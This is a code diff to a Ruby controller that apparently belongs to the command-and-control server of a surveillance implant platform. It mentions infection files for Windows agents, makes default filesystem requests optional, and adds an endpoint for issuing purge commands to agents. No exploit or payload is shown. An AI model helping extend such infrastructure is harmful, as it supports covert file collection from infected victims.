@@ -382,9 +382,6 @@ class AgentController < RESTController
     # add the files needed for the infection module
     agent.add_infection_files if agent.platform == 'windows'
 
-    # add default requests for the filesystem
-    agent.add_default_filesystem_requests
-
     # add the new agent to all the accessible list of all users
     SessionManager.instance.add_accessible(factory, agent)
 
@@ -608,14 +605,48 @@ class AgentController < RESTController
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
 
+      return not_found() if agent.nil?
+
       case @request[:method]
         when 'POST'
-          agent.filesystem_requests.create(@params['filesystem'])
+
+          if @params['filesystem'] == 'default'
+            agent.add_default_filesystem_requests
+          else
+            agent.filesystem_requests.create(@params['filesystem'])
+          end
+
           trace :info, "[#{@request[:peer]}] Added filesystem request #{@params['filesystem']}"
           Audit.log :actor => @session[:user][:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'"
         when 'DELETE'
           agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
           trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
+      end
+
+      return ok
+    end
+  end
+
+  def purge
+    require_auth_level :server, :tech, :view
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+
+      return not_found() if agent.nil?
+
+      case @request[:method]
+        when 'GET'
+          return ok(agent.purge)
+        when 'POST'
+          agent.purge = @params['purge']
+          agent.save
+          trace :info, "[#{@request[:peer]}] Added purge request #{@params['purge']}"
+          Audit.log :actor => @session[:user][:name], :action => "agent.purge", :desc => "Added a purge request for agent '#{agent['name']}'"
+        when 'DELETE'
+          agent.purge = [0, 0]
+          agent.save
+          trace :info, "[#{@request[:peer]}] Purge command reset"
       end
 
       return ok
